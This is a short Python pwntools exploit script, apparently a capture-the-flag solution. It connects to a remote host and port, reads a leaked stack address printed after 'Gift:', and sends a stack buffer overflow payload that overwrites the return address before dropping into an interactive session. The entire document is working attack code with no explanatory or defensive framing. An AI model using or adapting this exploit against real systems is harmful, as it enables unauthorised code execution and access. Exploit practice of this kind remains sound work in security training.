from pwn import *

context.log_level='debug'
p = remote("113.201.14.253","16088")
# p = process('./pwn1')


# attach(p,'b *0x0804859E')
p.recvuntil('Gift:')
# buf = int(p.recv(12),16)
buf = int(p.recv(len('0xffe96da0')),16)

print hex(buf)

paylaod = 'a'*0x34 + p32(buf+0x40) + 'junk' + p32(0x8048540)
pause()
p.send(paylaod)
pause()	
p.interactive()